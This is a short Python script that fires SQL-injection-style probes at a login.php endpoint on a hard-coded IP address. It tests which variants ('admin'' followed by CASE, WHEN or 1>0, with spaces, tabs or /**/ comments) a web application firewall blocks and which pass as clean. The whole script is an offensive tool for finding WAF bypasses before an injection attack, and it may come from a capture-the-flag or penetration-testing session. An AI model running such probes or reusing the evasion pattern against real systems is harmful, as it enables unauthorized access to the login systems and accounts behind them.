import requests
def test(payload, label=""):
    r = requests.post("http://52.66.177.113/login.php", data={"username": payload, "password": "x"})
    waf = "BLOCKED" if "Suspicious input detected" in r.text else "clean"
    print(f"[{label:40}] waf={waf}")

test("admin' 1>0", "space-before-digit")
test("admin'1>0", "no-space-before-digit")
test("admin' CASE", "space-before-case")
test("admin'CASE", "no-space-before-case")
test("admin' WHEN", "space-before-when")
test("admin'WHEN", "no-space-before-when")
test("admin'/**/1>0", "comment-instead-of-space")
test("admin'\t1>0", "tab-instead-of-space")
